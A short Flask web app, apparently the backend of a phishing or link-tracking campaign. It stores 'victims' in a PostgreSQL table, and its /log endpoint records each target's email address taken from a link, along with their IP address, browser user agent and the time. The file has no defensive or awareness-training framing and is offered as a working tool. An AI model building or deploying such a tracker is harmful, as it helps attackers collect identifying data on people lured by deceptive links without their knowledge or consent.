from flask import Flask, request, jsonify, render_template
from flask_sqlalchemy import SQLAlchemy
import os
from datetime import datetime
import logging

app = Flask(__name__)

# Configuración para PostgreSQL en Railway
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv('DATABASE_URL').replace("postgres://", "postgresql://")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

class Victim(db.Model):
    __tablename__ = 'victims'
    id = db.Column(db.Integer, primary_key=True)
    email = db.Column(db.String(100), nullable=False)  # Correo del usuario desde el link
    ip = db.Column(db.String(50))
    user_agent = db.Column(db.String(200))
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/log', methods=['POST'])
def log_victim():
    try:
        data = request.json
        email = data.get('email', 'anonimo@example.com')
        
        # Registrar en la base de datos
        new_entry = Victim(
            email=email,
            ip=request.remote_addr,
            user_agent=request.headers.get('User-Agent')
        )
        db.session.add(new_entry)
        db.session.commit()
        
        return jsonify({"status": "success"}), 200
    except Exception as e:
        logging.error(f"Error al registrar acceso: {e}")
        return jsonify({"error": str(e)}), 500

# Crear tablas al iniciar (solo en primera ejecución)
with app.app_context():
    db.create_all()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))